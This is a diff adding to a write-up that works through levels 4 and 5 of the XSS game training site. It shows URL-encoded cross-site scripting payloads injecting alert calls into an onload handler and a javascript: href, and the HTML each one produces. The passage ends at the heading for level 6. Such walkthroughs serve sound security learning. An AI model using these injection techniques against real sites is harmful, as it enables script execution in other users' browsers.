@@ -75,6 +75,11 @@ However, I eventully realized that the semicolon is not being parsed and if I pa
     https://xss-game.appspot.com/level4/frame?timer=')%3Balert('1
 ```
 
+Which results in this
+```javascript
+    <img src="/static/loading.gif" onload="startTimer('');alert('1');">
+```
+
 ```html
 <body id="level4">
   <img src="/static/logos/level4.png" />
@@ -84,3 +89,25 @@ However, I eventully realized that the semicolon is not being parsed and if I pa
   <div id="message">Your timer will execute in {{ timer }} seconds.</div>
 </body>
 ```
+
+Level 5: Breaking protocol
+---------------------------------
+
+At first this problem looks complicated, however it took me much less time now that I know to pass in URL encoded characters. After clicking sign-up, you see a page with a next href. The location to where this href goes to is entirely regulated by next=confirm, so this variable could be manipulated to make the link execute javascript.
+
+```javascript
+<a href="{{ next }}">Next >></a>
+```
+
+My method was 
+```
+    https://xss-game.appspot.com/level5/frame/signup?next=javascript%3Aalert(1)
+```
+
+Which turned the link to
+```html
+    <a href="javascript:alert(1)">Next &gt;&gt;</a>
+```
+
+Level 6: Follow the
+------------------------
